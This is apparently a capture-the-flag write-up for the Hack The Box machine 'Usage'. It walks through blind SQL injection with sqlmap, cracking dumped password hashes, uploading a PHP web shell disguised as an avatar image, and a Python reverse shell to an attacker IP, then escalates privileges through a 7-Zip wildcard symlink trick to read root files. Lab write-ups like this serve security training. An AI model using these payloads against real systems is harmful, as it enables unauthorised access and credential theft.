# Usage

## Initial Nmap Scan

```
❯ sudo nmap -sV -sC -oA nmap/usage_intial_scan 10.10.11.18
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-11 05:51 EDT
Nmap scan report for 10.10.11.18
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.39 seconds
```

```bash
sudo echo "10.10.11.18    usage.htb" >> /etc.hosts
```

```html
<!-- jQuery 2.1.4 -->
<script src="http://admin.usage.htb/vendor/laravel-admin/AdminLTE/plugins/jQuery/jQuery-2.1.4.min.js"></script>
<!-- Bootstrap 3.3.5 -->
<script src="http://admin.usage.htb/vendor/laravel-admin/AdminLTE/bootstrap/js/bootstrap.min.js"></script>
<!-- iCheck -->
<script src="http://admin.usage.htb/vendor/laravel-admin/AdminLTE/plugins/iCheck/icheck.min.js"></script>
<script>
```

```html
    <form action="http://admin.usage.htb/admin/auth/login" method="post">
      <div class="form-group has-feedback 1">

        
        <input type="text" class="form-control" placeholder="Username" name="username" value="">
        <span class="glyphicon glyphicon-envelope form-control-feedback"></span>
      </div>
      <div class="form-group has-feedback 1">

        
        <input type="password" class="form-control" placeholder="Password" name="password">
        <span class="glyphicon glyphicon-lock form-control-feedback"></span>
      </div>
      <div class="row">
        <div class="col-xs-8">
                    <div class="checkbox icheck">
            <label>
              <input type="checkbox" name="remember" value="1" checked>
              Remember me
            </label>
          </div>
                  </div>
        <!-- /.col -->
        <div class="col-xs-4">
          <input type="hidden" name="_token" value="JMdGnqJD4wRMQL3HCYKTfvQrVlJKZqFriewAPoTI">
          <button type="submit" class="btn btn-primary btn-block btn-flat">Login</button>
        </div>
        <!-- /.col -->
      </div>
    </form>
```

### Blog Dashboard

* Able to register and login
* [http://usage.htb/dashboard](http://usage.htb/dashboard)

#### Blog Posts

*   #### Unraveling the Significance of Server-side Language Penetration Testing

    In the intricate realm of cybersecurity, server-side language penetration testing emerges as a beacon of vigilance, illuminating the path towards fortified digital landscapes. By delving into the inner workings of these languages, security experts uncover hidden vulnerabilities that could potentially serve as gateways for cyber threats. Such proactive measures, collectively termed penetration testing, empower organizations to preempt

### Dirbuster

```
---- Scanning URL: http://usage.htb/ ----
+ http://usage.htb/dashboard (CODE:302|SIZE:334)
+ http://usage.htb/favicon.ico (CODE:200|SIZE:0)
+ http://usage.htb/index.php (CODE:200|SIZE:5181)
+ http://usage.htb/login (CODE:200|SIZE:5141)
+ http://usage.htb/logout (CODE:302|SIZE:334)
+ http://usage.htb/registration (CODE:200|SIZE:5112)
+ http://usage.htb/robots.txt (CODE:200|SIZE:24)

-----------------
END_TIME: Sat May 11 06:18:29 2024
DOWNLOADED: 4612 - FOUND: 7
```

#### Dirb with linux LFI list - no results

```
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
```

### Ffuf

```
 :: Method           : GET
 :: URL              : http://10.10.11.18
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.usage.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

admin                   [Status: 200, Size: 3304, Words: 493, Lines: 89, Duration: 67ms]
```

## SQL Injection

### Registration Form

<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

### Sqlmap

```
sqlmap -r ~/Documents/htb/usage/reset_password.req -p email --dbms=mysql --answers="follow=Y" --batch --level 5 --risk 3
```

```
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=huE6Ex2JNgNlKyMTJIZYChsSEQ8OTeJNWhsnXy4C&email=test@test.com' AND 3819=(SELECT (CASE WHEN (3819=3819) THEN 3819 ELSE (SELECT 5811 UNION SELECT 1136) END))-- -

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: _token=huE6Ex2JNgNlKyMTJIZYChsSEQ8OTeJNWhsnXy4C&email=test@test.com' AND 4024=BENCHMARK(5000000,MD5(0x7742566d))-- qFny
```

```
sqlmap -r ~/Documents/htb/usage/reset_password.req -p email --dbms=mysql --answers="follow=Y" --dbs
```

```
available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog
```

```
sqlmap -r ~/Documents/htb/usage/reset_password.req -p email --dbms=mysql --answers="follow=Y" --technique=B --threads 10 -D usage_blog --tables
```

```
Database: usage_blog
[15 tables]
+------------------------+
| admin_menu             |
| admin_operation_log    |
| admin_permissions      |
| admin_role_menu        |
| admin_role_permissions |
| admin_role_users       |
| admin_roles            |
| admin_user_permissions |
| admin_users            |
| blog                   |
| failed_jobs            |
| migrations             |
| password_reset_tokens  |
| personal_access_tokens |
| users                  |
+------------------------+
```

```
sqlmap -r ~/Documents/htb/usage/reset_password.req -p email --dbms=mysql --answers="follow=Y" --technique=B --threads 10 -D usage_blog -T users --columns
```

```
Database: usage_blog
Table: users
[7 columns]
+-------------------+
| Column            |
+-------------------+
| name              | varchar(255)    |
| created_at        | timestamp       |
| email             | varchar(255)    |
| email_verified_at | timestamp       |
| id                | bigint unsigned |
| password          | varchar(255)    |
| remember_token    |
+-------------------+
```

```
sqlmap -r ~/Documents/htb/usage/reset_password.req -p email --dbms=mysql --answers="follow=Y" --technique=B -D usage_blog -T users --dump --fresh-queries
```

```
Database: usage_blog
Table: users
[2 entries]
+----+---------------+--------+--------------------------------------------------------------+---------------------+---------------------+----------------+-------------------+
| id | email         | name   | password                                                     | created_at          | updated_at          | remember_token | email_verified_at |
+----+---------------+--------+--------------------------------------------------------------+---------------------+---------------------+----------------+-------------------+
| 1  | raj@raj.com   | raj    | $2y$10$7ALmTTEYfRVd8Rnyep/ck.bSFKfXfsltPLkyQqSp/TT7X1wApJt4. | 2023-08-17 03:16:02 | 2023-08-17 03:16:02 | NULL           | NULL              |
| 2  | raj@usage.htb | raj    | $2y$10$rbNCGxpWp1HSpO1gQX4uPO.pDg1nszoI/UhwHvfHDdfdfo9VmDJsa | 2023-08-22 08:55:16 | 2023-08-22 08:55:16 | NULL           | NULL              |
+----+---------------+--------+--------------------------------------------------------------+---------------------+---------------------+----------------+-------------------+
```

```
hashcat -m 3200 --user creds /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

```
administrator:$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2:whatever1                      │
raj:$2y$10$rbNCGxpWp1HSpO1gQX4uPO.pDg1nszoI/UhwHvfHDdfdfo9VmDJsa:xander                                   │
raj:$2y$10$7ALmTTEYfRVd8Rnyep/ck.bSFKfXfsltPLkyQqSp/TT7X1wApJt4.:xander
```

```
sqlmap -r ~/Documents/htb/usage/reset_password.req -p email --dbms=mysql --answers="follow=Y" --technique=B -D usage_blog -T admin_users --dump  --fresh-queries
```

```
Database: usage_blog
Table: admin_users
[1 entry]
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
```

## Admin Dashboard

<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

### User Edit

#### Burp

* Intercept the user edit form submit.
* Change the file type to .php and replace the image data with a php shell.

```
POST /admin/auth/users/1 HTTP/1.1
Host: admin.usage.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-PJAX: true
X-PJAX-Container: #pjax-container
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------30014490272757962256839649296
Content-Length: 8294
Origin: http://admin.usage.htb
Connection: close
Referer: http://admin.usage.htb/admin/auth/users/1/edit
Cookie: XSRF-TOKEN=eyJpdiI6InNkR3d1TU1BQlRSUWNXREkrMS9ma2c9PSIsInZhbHVlIjoienJiOGdPM00zdlFqeHNobWxZdmxtaW85dVgxSWJTZkFzUkQ2VVVWK2FsQU4yU0RKVTBJTnl5N2xTbmpmb00rbCtnWEY2SnJiUUVSZTBEOHJoYVh1cUd6aGFMUlRrN1dNaG02ZjFjUGJYZm5KUFhKU25WZitTRnU5TlAxUWlycCsiLCJtYWMiOiIzMDRmYTEyMmM5YWQyZGYzMDcxYjYwYzIwMWIzNTU2ZTVkZTI2NTQ2NmFlMGQ4Y2JkYjE2ZjI4MDg1NDU2N2ZjIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6Ik9LR1gyZnNoVTBCNDYxNHU1R0RGUUE9PSIsInZhbHVlIjoiZ1JQaENBVWpGdjYzcW9hNll1dUhCazFocktLYjZWWEpoRVJCcTZwSEFxZlExV0dseTUxRTkvZTVEcVNlcDFVUlVvZ1FyQ0l2NVdsRHFaR0xIMnZwMXZ1bWJ6ZVJHbjEvWXpxbGJ4UmJPeG1KYk9XUmw2YlRrVjd0cDdFWG5WTnciLCJtYWMiOiJjMzE4MDBlMmRmODdhNmU3N2YxZWE5YTU0NGU0OTdmYzhiMjZiYTNmOWEzZWZlZDE2YzIxYTdhZmU1ZGY0MTQzIiwidGFnIjoiIn0%3D; remember_admin_59ba36addc2b2f9401580f014c7f58ea4e30989d=eyJpdiI6IitjRThpQ3FNaWVtc3YvbUROM2hCN1E9PSIsInZhbHVlIjoiZm1YMVBsRHAzT3BNTmJIQTBybml0YTk0dTNidmZ1V2FrS2ZaOTZpY3dTMjFtVXAxaUhOVDQwTlpVd2dKWkFnbS9IVEhONXlUM0VNbGorYm8ybVo4bUJOL1o4S2dZcFloWDcrQWpFNkc4eDlSMGh4ZzBwWnFZQUNaaWI1Ti9obTJLSWkzcFQ1Smo5WXRCVkFEaEt2UlFOZ3RSRTNvVkVsSWlWeDZ3MStwWVpOMkhyZUR3MitJTFJRN1FjZDFReVdyS2JzUUYrOEdMSVFnbVZBeHp6YW9vUWdydStJNnFzS0NBd09UeDA3MXhRZz0iLCJtYWMiOiI3NDdhOGJiN2Y2YmRmMDNjYmJjN2FkZDAyYWIwNWZmNjQ5OGEzYzIwMGNjMmYwODZjNzUzZjZlZTM0ZTZiZWI2IiwidGFnIjoiIn0%3D

-----------------------------30014490272757962256839649296
Content-Disposition: form-data; name="username"

admin
-----------------------------30014490272757962256839649296
Content-Disposition: form-data; name="name"

Administrator
-----------------------------30014490272757962256839649296
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_REQUEST["cmd"]); ?>
-----------------------------30014490272757962256839649296
Content-Disposition: form-data; name="roles[]"

1
-----------------------------30014490272757962256839649296
Content-Disposition: form-data; name="roles[]"


-----------------------------30014490272757962256839649296
Content-Disposition: form-data; name="permissions[]"


-----------------------------30014490272757962256839649296
Content-Disposition: form-data; name="_token"

Tri2ts2uQPDI4H7pCgJQd613m6xrDAdii4lJnzEU
-----------------------------30014490272757962256839649296
Content-Disposition: form-data; name="_method"

PUT
-----------------------------30014490272757962256839649296
Content-Disposition: form-data; name="_previous_"

http://admin.usage.htb/admin/auth/users
-----------------------------30014490272757962256839649296--

```

```
http://admin.usage.htb/uploads/images/shell.php?cmd=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%2210.10.16.30%22%2C9001))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bimport%20pty%3B%20pty.spawn(%22%2Fbin%2Fbash%22)%27
```

## Reverse Shell

```bash
cd .ssh
python3 -m http.server
```

* Attacker machine

```bash
wget http://usage.htb:8000/id_rsa
chmod 600 id_rsa
ssh dash@usage.htb -i id_rsa
```

```
dash@usage:~$ uname -a Linux usage 5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```

```
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=usage_blog
DB_USERNAME=staff
DB_PASSWORD=s3cr3t_c0d3d_1uth
```

```
╔══════════╣ Last time logon each user
Username         Port     From             Latest
root             pts/0    10.10.14.40      Mon Apr  8 13:17:47 +0000 2024
dash             pts/0    10.10.16.30      Sat May 11 20:32:26 +0000 2024
xander           pts/0    10.10.14.9       Sat May 11 17:53:25 +0000 2024
```

```
╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 Apr  2 18:20 /etc/ldap
```

```
-rwxr-sr-x 1 root tty 23K Mar 22 12:25 /usr/bin/write.ul (Unknown SGID binary)
```

```
#   Name                                                               Potentially Vulnerable?  Check Result
 -   ----                                                               -----------------------  ------------
 1   exploit/linux/local/cve_2022_0847_dirtypipe                        Yes                      The target appears to be vulnerable. Linux kernel version found: 5.15.0
 2   exploit/linux/local/pkexec                                         Yes                      The service is running, but could not be validated.
 3   exploit/linux/local/su_login                                       Yes                      The target appears to be vulnerable.
```

```bash
dash@usage:~$ cat .monitrc
#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd

#Apache
check process apache with pidfile "/var/run/apache2/apache2.pid"
    if cpu > 80% for 2 cycles then alert


#System Monitoring
check system usage
    if memory usage > 80% for 2 cycles then alert
    if cpu usage (user) > 70% for 2 cycles then alert
        if cpu usage (system) > 30% then alert
    if cpu usage (wait) > 20% then alert
    if loadavg (1min) > 6 for 2 cycles then alert
    if loadavg (5min) > 4 for 2 cycles then alert
    if swap usage > 5% then alert

check filesystem rootfs with path /
       if space usage > 80% then alert
```

```
su xander
3nc0d3d_pa$$w0rd
```

```
sudo -l
```

```bash
xander@usage:/home/dash$ sudo -l
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

```
strings /usr/bin/usage_management
```

```
/var/www/html
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
```

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks?source=post_page-----f1c2793eeb7e--------------------------------" %}

```
xander@usage:/var/www/html$ touch @root
xander@usage:/var/www/html$ ln -s /root/root.txt root
xander@usage:/var/www/html$ sudo usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Xeon(R) Gold 5218 CPU @ 2.30GHz (50657),ASM,AES-NI)

Open archive: /var/backups/project.zip
--
Path = /var/backups/project.zip
Type = zip
Physical Size = 54905722

Scanning the drive:

WARNING: No more files
8b1a7b1dc503bee8d72142616cd06abb

2984 folders, 17972 files, 118717222 bytes (114 MiB)

Updating archive: /var/backups/project.zip

Items to compress: 20956


Files read from disk: 17972
Archive size: 55052646 bytes (53 MiB)

Scan WARNINGS for files and folders:

8b1a7b1dc503bee8d72142616cd06abb : No more files
----------------
Scan WARNINGS: 1
```
